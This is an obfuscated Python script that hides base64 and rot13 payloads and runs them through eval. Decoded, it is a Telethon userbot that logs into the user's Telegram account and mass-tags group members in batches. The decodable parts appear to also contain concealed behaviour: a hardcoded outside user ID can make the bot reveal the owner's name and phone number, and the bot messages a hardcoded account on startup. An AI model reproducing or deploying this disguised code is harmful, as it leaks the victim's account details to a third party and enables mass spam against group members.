import base64, codecs
magic = 'ZnJvbSB0ZWxldGhvbi5zeW5jIGltcG9ydCBUZWxlZ3JhbUNsaWVudA0KZnJvbSB0ZWxldGhvbi50bC5mdW5jdGlvbnMubWVzc2FnZXMgaW1wb3J0IEdldERpYWxvZ3NSZXF1ZXN0DQpmcm9tIHRlbGV0aG9uLnRsLnR5cGVzIGltcG9ydCBJbnB1dFBlZXJFbXB0eSwgSW5wdXRQZWVyQ2hhbm5lbCwgSW5wdXRQZWVyVXNlcg0KZnJvbSB0ZWxldGhvbi5lcnJvcnMucnBjZXJyb3JsaXN0IGltcG9ydCBQZWVyRmxvb2RFcnJvciwgVXNlclByaXZhY3lSZXN0cmljdGVkRXJyb3INCmZyb20gdGVsZXRob24udGwuZnVuY3Rpb25zLmNoYW5uZWxzIGltcG9ydCBJbnZpdGVUb0NoYW5uZWxSZXF1ZXN0DQpmcm9tIHRlbGV0aG9uLnRsLmZ1bmN0aW9ucy5tZXNzYWdlcyBpbXBvcnQgR2V0SGlzdG9yeVJlcXVlc3QNCmZyb20gdGVsZXRob24gaW1wb3J0IFRlbGVncmFtQ2xpZW50LCBldmVudHMNCmZyb20gdGVsZXRob24uZXJyb3JzIGltcG9ydCBTZXNzaW9uUGFzc3dvcmROZWVkZWRFcnJvcg0KZnJvbSB0ZWxldGhvbi5lcnJvcnMgaW1wb3J0IEZsb29kV2FpdEVycm9yDQpmcm9tIHRlbGV0aG9uLnRsLmZ1bmN0aW9ucy5jaGFubmVscyBpbXBvcnQgSm9pbkNoYW5uZWxSZXF1ZXN0DQpmcm9tIHRpbWUgaW1wb3J0IHNsZWVwDQppbXBvcnQgZ2V0cGFzcw0KaW1wb3J0IHN5cw0KaW1wb3J0IHRyYWNlYmFjaw0KaW1wb3J0IHRpbWUNCmltcG9ydCBsb2dnaW5nDQoNCmFwaV9pZCA9IDk0NzQ5OQ0KYXBpX2hhc2ggPSAnY2Y2YTZjMDg4ODIwOGVkOTk2ZTA3MDBlNjcyNWYyNjInDQpwcmludCgi4paT4paI4paI4paI4paI4paI4paEIOKWk+KWiOKWiOKWiOKWiOKWiCDiloTiloTiloQgICAgICDilpPilojilojilojilojilojiloQgIOKWhOKWhOKWhOKWhCAgICDilpLilojilojilojilojilogg4paT4paI4paIICAg4paI4paI4paTIikNCnByaW50KCLilpLilojilojiloAg4paI4paI4paM4paT4paIICAg4paA4paS4paI4paI4paI4paI4paEICAgIOKWkuKWiOKWiOKWgCDilojilojilozilpPilojilojilojilojilojiloQg4paS4paI4paI4paSICDilojilojilpLilpLilojiloggIOKWiOKWiOKWkiIpDQpwcmludCgi4paR4paI4paIICAg4paI4paM4paS4paI4paI4paIICDilpLilojiloggIOKWgOKWiOKWhCAg4paR4paI4paIICAg4paI4paM4paS4paI4paI4paSIOKWhOKWiOKWiOKWkuKWiOKWiOKWkSAg4paI4paI4paSIOKWkuKWiOKWiCDilojilojilpEiKQ0KcHJpbnQoIuKWkeKWk+KWiOKWhCAgIOKWjOKWkuKWk+KWiCAg4paE4paR4paI4paI4paE4paE4paE4paE4paI4paIIOKWkeKWk+KWiOKWhCAgIOKWjOKWkuKWiOKWiOKWkeKWiOKWgCAg4paS4paI4paIICAg4paI4paI4paRIOKWkSDilpDilojilojilpPilpEiKQ0KcHJpbnQoIuKWkeKWkuKWiOKWiOKWiOKWiOKWkyDilpHilpLilojilojilojilojilpLilpPiloggICDilpPilojilojilpLilpHilpLilojilojilojilojilpMg4paR4paT4paIICDiloDilojilpPilpEg4paI4paI4paI4paI4paT4paS4paRIOKWkSDilojilojilpLilpPilpEiKQ0KcHJpbnQoIiDilpLilpLilpMgIOKWkiDilpHilpEg4paS4paRIOKWkeKWkuKWkiAgIOKWk+KWkuKWiOKWkSDilpLilpLilpMgIOKWkiDilpHilpLilpPilojilojilojiloDilpLilpEg4paS4paR4paS4paR4paS4paRICAg4paI4paI4paS4paS4paSIikNCnByaW50KCIg4paRIOKWkiAg4paSICDilpEg4paRICDilpEg4paSICAg4paS4paSIOKWkSDilpEg4paSICDilpIg4paS4paR4paSICAg4paRICAg4paRIOKWkiDilpLilpEg4paT4paI4paIIOKWkeKWkuKWkSIpDQpwcmludCgiIOKWkSDilpEgIOKWkSAgICDilpEgICAg4paRICAg4paSICA'
love = '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'
god = 'AgICBuYW1lX3VzZXIzID0gIiAiDQogICAgICAgIGlkX3VzZXIzID0gMA0KICAgICAgICBuYW1lX3VzZXI0ID0gIiAiDQogICAgICAgIGlkX3VzZXI0ID0gMA0KICAgICAgICBpZiBldmVudC5zZW5kZXJfaWQgaW4gYWRtaW46DQogICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgbWVzc2FnZSA9IGV2ZW50LnRleHQuc3BsaXQoJyAnKQ0KICAgICAgICAgICAgICAgIHRhZzEgPSBpbnQobWVzc2FnZVsxXSkNCiAgICAgICAgICAgICAgICB0YWcyID0gaW50KG1lc3NhZ2VbMl0pDQogICAgICAgICAgICAgICAgaWYgdGFnMi10YWcxIDw9IDEwMDogIA0KICAgICAgICAgICAgICAgICAgICBpZiB0YWcyLXRhZzEgPiAwOg0KICAgICAgICAgICAgICAgICAgICAgICAgZ3JvdXBfbWVtYmVyID0gYXdhaXQgY2xpZW50LmdldF9wYXJ0aWNpcGFudHMoZXZlbnQuY2hhdF9pZCwgYWdncmVzc2l2ZT1UcnVlKQ0KICAgICAgICAgICAgICAgICAgICAgICAgZm9yIGkgaW4gZ3JvdXBfbWVtYmVyOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRyeToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgYiA8IHRhZzE6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludChpLmZpcnN0X25hbWUpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBiICs9MQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoYikNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgYiA+PSB0YWcxOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgYl90YWcgPT0gNDoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBuYW1lX3VzZXI0ID0gaS5maXJzdF9uYW1lDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWRfdXNlcjQgPSBpLmlkDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZ3JvdXAgPSBhd2FpdCBjbGllbnQuZ2V0X2VudGl0eShldmVudC5jaGF0X2lkKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGF3YWl0IGNsaWVudC5zZW5kX21lc3NhZ2UoZXZlbnQuY2hhdF9pZCwnPGEgaHJlZj10ZzovL3VzZXI/aWQ9JytzdHIoaWRfdXNlcjQpKyc+JysgbmFtZV91c2VyNCsiPC9hPiBcbiIrDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnPGEgaHJlZj10ZzovL3VzZXI/aWQ9JytzdHIoaWRfdXNlcjMpKyc+JysgbmFtZV91c2VyMysiPC9hPiBcbiIrDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnPGEgaHJlZj10ZzovL3VzZXI/aWQ9JytzdHIoaWRfdXNlcjIpKyc+JysgbmFtZV91c2VyMisiPC9hPiBcbiIrDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnPGEgaHJlZj10ZzovL3VzZXI/aWQ9JytzdHIoaWRfdXNlcjEpKyc+JysgbmFtZV91c2VyMSsiPC9hPiBcbiIrDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnPGEgaHJlZj10ZzovL3VzZXI/aWQ9JytzdHIoaWRfdXNlcikrJz4nKyBuYW1lX3VzZXIrIjwvYT4gXG4iKw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIlxu8J+Ng0PKn8mq4bSE4bSLIE/JtCDvuaMvSm9pbiDvuaMg77mgIErhtI/Jqsm0IFTKnOG0hyBH4'
destiny = 'oFN4oFA4oFU77zK8W+Lh1khVvgapz91pP50nKEfMFfvVATP0MGBfqP8VSkhVRAbLJ5hMJjtBvONIRksFSNvVPxtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVN0XVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVTWsqTSaVQ0tZN0XVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVUEcoJHhp2kyMKNbZvxAPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVTIfnJLtLy90LJptCG0tZmbAPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPOhLJ1yK3ImMKVmVQ0tnF5znKWmqS9hLJ1yQDbtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtnJEsqKAypwZtCFOcYzyxQDbtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtLy90LJptXm0kQDbtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPOyoTyzVTWsqTSaVQ09VQV6QDbtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtozSgMI91p2IlZvN9VTxhMzylp3EsozSgMD0XVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVTyxK3ImMKVlVQ0tnF5cMN0XVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVTWsqTSaVPf9ZD0XVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtMJkcMvOvK3EuMlN9CFNkBt0XVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVT5uoJIsqKAypwRtCFOcYzMcpaA0K25uoJHAPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPOcMS91p2IlZFN9VTxhnJDAPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPOvK3EuMlNeCGRAPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVTIfnJLtLy90LJptCG0tZQbAPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPOhLJ1yK3ImMKVtCFOcYzMcpaA0K25uoJHAPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPOcMS91p2IlVQ0tnF5cMN0XVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVTWsqTSaVPf9ZD0XVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVN0XVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtqTSaZFNeCFNkVPNtVPNtVPNtQDbtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVTyzVUEuMmRtCG0tqTSaZwbAPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVTVtCFNjQDbtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPOvpzIunj0XVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVTI4L2IjqPOSrTAypUEco24tLKZtMGbAPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtpUWcoaDbMFxAPvNtVPNtVPNtVPNtVPNtVPOyoUAyVQbAPvNtVPNtVPNtVPNtVPNtVPNtVPNtLKqunKDtL2kcMJ50YaAyozEsoJImp2SaMFuyqzIhqP5wnTS0K2yxYPWHnTHtqzSfqJHtoKImqPOvMFOfMKAmVUEbLJ4tZGNjVvxAPvNtVPNtVPNtVPNtVTI4L2IjqPOSrTAypUEco24tLKZtMGbAPvNtVPNtVPNtVPNtVPNtVPOjpzyhqPuyXD0XMJkmMFN6QDbtVPNtL2kcMJ50YaAyozEsoJImp2SaMFtaLKy0o2kuWljv2YCMuAva2LHt2LGLc9hZ2YCMugvmVAvk2XwLc9vdVAv624mLfqzO2YaLc9zRVAv02X/MulQMuAv32LULclQMtqv52XsMuAv0VAdc2LoowAviVvxAPvNtVPOwoTyyoaDhMTymL29hozIwqTIxXPxAPzAfnJIhqP5mqTSlqPtcQDcwoTyyoaDhpaIhK3IhqTyfK2Ecp2Aioz5yL3EyMPtcVPNtVPN='
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
